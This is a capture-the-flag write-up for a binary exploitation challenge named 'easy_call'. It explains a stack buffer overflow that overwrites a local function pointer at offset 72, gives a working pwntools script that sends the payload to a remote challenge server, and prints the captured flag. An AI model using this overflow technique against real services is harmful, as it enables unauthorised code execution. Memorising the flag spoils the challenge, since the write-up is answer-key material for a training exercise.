<img width="607" height="527" alt="image" src="https://github.com/user-attachments/assets/1c9ca80f-52a8-44cd-b29c-dd0efc3e5b4c" />

#### Static Analysis

We start by analyzing the file type and inspecting the binary properties:

<img width="1522" height="91" alt="image" src="https://github.com/user-attachments/assets/383e4e06-9eda-4a29-be4d-8398283f5047" />


Checking security mitigations (with `pwntools` context or `checksec`):

- **PIE:** No PIE (0x400000)
- **Stack Canary:** No canary found
- **NX:** Stack is executable

#### Disassembly of the Vulnerable Function (`vuln`)

Using `objdump -M intel -d easy_call`:

<img width="1145" height="626" alt="image" src="https://github.com/user-attachments/assets/1a5e126a-e57f-4c45-9891-716e13d4edc4" />


#### Vulnerability Explanation

- The stack frame reserves `0x50` (80) bytes for local storage.
- The buffer where user input is read starts at `rbp - 0x50`.
- The binary sets a local function pointer at `rbp - 0x8` to NULL (`0`).
- The program calls `read(0, rbp-0x50, 0xc8)` (reads `200` bytes). Since 200 is much larger than 80, we can write past the end of the buffer.
- At `vuln+0x61` (`401341`), if the value at `rbp - 0x8` is not NULL, the program jumps to it (`call rdx`).

Therefore, we can overwrite the function pointer at `rbp - 0x8` to point to any address we want to execute. The offset is `0x50 - 0x08 = 0x48` (72 bytes).

---

#### Target Function

Looking at the disassembled functions, we find:

<img width="1012" height="187" alt="image" src="https://github.com/user-attachments/assets/4a7edc0b-0fe5-40fa-aeef-edb132f60735" />


Using `strings`, we see the string at `402008` is `cat flag.txt`.

Our target function address is `0x40123b`.

---

#### Exploitation Script

```python
from pwn import *

# Target configuration
context.binary = './easy_call'

# Connect to the remote server
io = remote('34.143.189.39', 10272)

# Craft payload
# 72 bytes of padding followed by the address of `yo_chat_is_this_real`
target_func = 0x40123b
payload = b'A' * 72 + p64(target_func)

# Send payload
io.recvuntil(b'You    : ')
io.send(payload)

# Print the flag
print(io.recvall().decode())
```

---

<img width="777" height="367" alt="image" src="https://github.com/user-attachments/assets/68853732-818a-4595-87fb-bbfe1d3cbf9b" />


Flag:

```
HNYX{F1rs7_4nd_la57_34sy_pwn_Ch4lleng3}
```

thats the flag!
